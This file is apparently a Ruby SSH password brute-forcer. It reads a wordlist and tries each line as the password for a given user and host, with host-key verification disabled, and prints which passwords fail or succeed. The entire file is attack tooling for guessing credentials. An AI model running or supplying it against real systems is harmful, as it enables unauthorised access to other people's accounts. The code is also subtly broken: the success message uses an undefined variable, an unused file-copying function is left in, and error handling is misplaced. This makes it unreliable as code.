# mind mapped from the ruby brute forcing and authentication for SSH
require 'net/ssh'
require 'optiflag'

module Inputs extend OptiFlagSet
    flag "host"
    flag "user"
    flag "filename"
    and_process!
end

hostname = ARGV.flags.host
username = ARGV.flags.user
filew       = ARGV.flags.filename

if ARGV.flags.host == ""
    puts " [ - ] SSH disabled"
end 


def move(filepath, destination)
    require 'fileutils'
    my_dir = Dir["#{filepath}/*.txt"]
    my_dir.each do |filename|
    name = File.basename('filename', '.doc')[0,4]
    dest_folder = "#{destination}"
    FileUtils.cp(filename, dest_folder)
    end
end

def attack_ssh(host, username, password, port=22, timeout = 4)
  begin
    Net::SSH.start(host, username, :password => password,:auth_methods => ["password"], :port => port,
                   :verify_host_key => :never, :non_interactive => true, :timeout => timeout ) do |session|
      puts "Password Found: " + "#{host} | #{user}:#{password}"
    end
  rescue Net::SSH::ConnectionTimeout
    puts "\033[31mERROR => The host '#{host}' not alive!"
  rescue Net::SSH::Timeout
    puts "\033[31mERROR =>  The host '#{host}' disconnected/timeouted unexpectedly!"
  rescue Errno::ECONNREFUSED
    puts "\033[31mERROR =>  Incorrect port #{port} for #{host}"
  rescue Net::SSH::AuthenticationFailed
    puts "\033[31mWrong Password: #{host} | #{username}:#{password}"
  rescue Net::SSH::Authentication::DisallowedMethod
    puts "\033[31mERROR => The host '#{host}' doesn't accept password authentication method."
  else
    puts "weird error"  
  end
end




puts "Information"
puts "------------"
puts "\033[33mhost      => " + hostname
puts "\033[33muser      => " + username 
puts "\033[33mwordlist  => " + filew
puts "\n"
users = ["#{hostname}"]
  users.each do |user|
    file="#{filew}"
    File.readlines(file).each do |line|
            attack_ssh("#{hostname}", "#{username}", line)
    end
end